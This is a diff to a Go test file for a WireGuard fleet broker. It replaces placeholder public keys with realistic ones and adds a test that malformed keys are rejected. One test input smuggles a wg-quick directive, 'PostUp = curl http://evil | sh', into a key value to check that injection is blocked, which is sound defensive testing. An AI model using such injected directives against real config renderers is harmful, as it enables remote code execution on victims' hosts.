@@ -70,8 +70,8 @@ func seedNode(t *testing.T, st store.Store, id, mgmt, public, pubkey string, rol
 func TestRenderExitSpec(t *testing.T) {
 	ctx := context.Background()
 	b, st := newBroker(t)
-	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "MASTERPUB==", domain.RoleMaster)
-	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "EXITPUB==", domain.RoleExit)
+	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
+	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
 
 	spec, err := b.RenderNodeSpec(ctx, "exit-de-1")
 	if err != nil {
@@ -101,7 +101,7 @@ func TestRenderExitSpec(t *testing.T) {
 		t.Fatalf("peers = %d, want 1", len(spec.Peers))
 	}
 	mp := spec.Peers[0]
-	if mp.Name != "master-xa-1" || mp.PublicKey != "MASTERPUB==" {
+	if mp.Name != "master-xa-1" || mp.PublicKey != "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=" {
 		t.Errorf("master peer = %+v", mp)
 	}
 	if mp.Endpoint != "" {
@@ -135,8 +135,8 @@ func TestRenderExitSpec(t *testing.T) {
 func TestRenderMasterSpec(t *testing.T) {
 	ctx := context.Background()
 	b, st := newBroker(t)
-	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "MASTERPUB==", domain.RoleMaster)
-	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "EXITPUB==", domain.RoleExit)
+	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
+	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
 
 	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
 	if err != nil {
@@ -163,7 +163,7 @@ func TestRenderMasterSpec(t *testing.T) {
 		t.Fatalf("exit tunnels = %d, want 1", len(m.ExitTunnels))
 	}
 	et := m.ExitTunnels[0]
-	if et.Name != "exit-de-1" || et.ServerPublicKey != "EXITPUB==" {
+	if et.Name != "exit-de-1" || et.ServerPublicKey != "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=" {
 		t.Errorf("exit tunnel = %+v", et)
 	}
 	if et.Endpoint != "198.51.100.7:51820" {
@@ -187,7 +187,7 @@ func TestRenderSkipsUnregisteredPeer(t *testing.T) {
 	ctx := context.Background()
 	b, st := newBroker(t)
 	// Master registered, exit NOT (no pubkey yet).
-	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "MASTERPUB==", domain.RoleMaster)
+	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
 	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "", domain.RoleExit)
 
 	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
@@ -204,15 +204,28 @@ func TestRegisterPublicKey(t *testing.T) {
 	b, st := newBroker(t)
 	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "", domain.RoleExit)
 
-	if err := b.RegisterPublicKey(ctx, "exit-de-1", "FRESHPUB=="); err != nil {
+	if err := b.RegisterPublicKey(ctx, "exit-de-1", "/Lpxg7UgcxjrQcfYYl9CaqXDLy/bYSHQ3iD/KXnY1zU="); err != nil {
 		t.Fatalf("register: %v", err)
 	}
 	node, _ := st.GetNode(ctx, "exit-de-1")
-	if node.PublicKey != "FRESHPUB==" {
+	if node.PublicKey != "/Lpxg7UgcxjrQcfYYl9CaqXDLy/bYSHQ3iD/KXnY1zU=" {
 		t.Errorf("public key = %q", node.PublicKey)
 	}
 	if err := b.RegisterPublicKey(ctx, "exit-de-1", ""); err == nil {
 		t.Error("empty public key should be rejected")
+	}
+
+	// A malformed key (not a 32-byte Curve25519 key) must be rejected before it is
+	// stored — it would otherwise be rendered verbatim into peer WG configs. A
+	// multi-line value attempting wg-quick directive injection is the attack.
+	for _, bad := range []string{
+		"not-a-key",
+		"short==",
+		"FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=\nPostUp = curl http://evil | sh",
+	} {
+		if err := b.RegisterPublicKey(ctx, "exit-de-1", bad); err == nil {
+			t.Errorf("malformed public key %q should be rejected", bad)
+		}
 	}
 }
 
@@ -226,8 +239,8 @@ func TestRenderUnknownNode(t *testing.T) {
 func TestMasterSpecHonorsDrain(t *testing.T) {
 	ctx := context.Background()
 	b, st := newBroker(t)
-	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "MASTERPUB==", domain.RoleMaster)
-	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "EXITPUB==", domain.RoleExit)
+	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
+	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
 	if err := st.SetNodeDrain(ctx, "exit-de-1", true); err != nil {
 		t.Fatal(err)
 	}
@@ -248,8 +261,8 @@ func TestMasterSpecHonorsDrain(t *testing.T) {
 func TestMasterSpecComposeDerivesClientDNS(t *testing.T) {
 	ctx := context.Background()
 	b, st := newBroker(t)
-	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "MASTERPUB==", domain.RoleMaster)
-	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "EXITPUB==", domain.RoleExit)
+	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
+	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
 
 	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
 	if err != nil {
@@ -268,7 +281,7 @@ func TestMasterSpecComposeDerivesClientDNS(t *testing.T) {
 func TestDecommissionSpec(t *testing.T) {
 	ctx := context.Background()
 	b, st := newBroker(t)
-	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "EXITPUB==", domain.RoleExit)
+	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
 	if err := st.SetNodeDecommission(ctx, "exit-de-1", true); err != nil {
 		t.Fatal(err)
 	}
@@ -290,8 +303,8 @@ func TestDecommissionSpec(t *testing.T) {
 func TestDecommissioningExitDroppedFromMaster(t *testing.T) {
 	ctx := context.Background()
 	b, st := newBroker(t)
-	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "MASTERPUB==", domain.RoleMaster)
-	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "EXITPUB==", domain.RoleExit)
+	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
+	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
 	_ = st.SetNodeDecommission(ctx, "exit-de-1", true)
 
 	spec, err := b.RenderNodeSpec(ctx, "master-xa-1")
@@ -306,8 +319,8 @@ func TestDecommissioningExitDroppedFromMaster(t *testing.T) {
 func TestWARPMTUDefault(t *testing.T) {
 	ctx := context.Background()
 	b, st := newBroker(t)
-	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "MASTERPUB==", domain.RoleMaster)
-	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "EXITPUB==", domain.RoleExit)
+	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
+	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
 
 	exitSpec, err := b.RenderNodeSpec(ctx, "exit-de-1")
 	if err != nil {
@@ -338,8 +351,8 @@ func TestWARPMTUOverrideLowersClientMTU(t *testing.T) {
 	fleet := testFleet()
 	fleet.Exits[0].WARPMTU = 1340 // operator pins a constrained WARP path
 	b := New(st, fleet, log)
-	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "MASTERPUB==", domain.RoleMaster)
-	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "EXITPUB==", domain.RoleExit)
+	seedNode(t, st, "master-xa-1", "10.20.25.254", "203.0.113.1", "FmJoBTB+ew7wVUxXhRs6xCNPjPi9SQJRU6vIVW4Igyc=", domain.RoleMaster)
+	seedNode(t, st, "exit-de-1", "10.20.0.5", "198.51.100.7", "A/3Hs1FWpM4iZiG09od1cESePk+PiG2Tg1jKlvX3BFY=", domain.RoleExit)
 
 	exitSpec, err := b.RenderNodeSpec(ctx, "exit-de-1")
 	if err != nil {
